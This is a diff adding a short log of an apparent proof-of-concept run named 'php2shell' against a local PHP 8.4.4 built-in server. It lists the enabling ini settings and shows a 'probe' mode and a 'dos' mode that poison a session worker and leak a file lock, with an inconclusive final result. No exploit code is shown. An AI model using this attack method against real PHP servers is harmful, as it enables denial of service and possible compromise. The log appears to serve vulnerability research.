@@ -1,0 +1,13 @@
+=== php2shell PoC demo — Wed Oct 21 01:53:58 PM UTC 2026 ===
+--- server: stock PHP 8.4.4 release build, php -S 127.0.0.1:8095
+--- ini: upload_progress=On, serialize_handler=php, memory_limit=16M
+
+### MODE: probe
+[probe] R1 poison sid=pocsid1792590838
+[probe] R1 -> HTTP 200 (0.1s)
+[probe] R2 (different sid) -> HTTP 200: worker answers (reuse consumed there)
+
+### MODE: dos
+[DoS] poison worker with sid=dossid1792590839
+[DoS] poison -> HTTP 200; flock on sess_dossid1792590839 leaked inside worker
+[DoS] same-sid follow-up -> HTTP 200 in 0.0s (lock released?!)
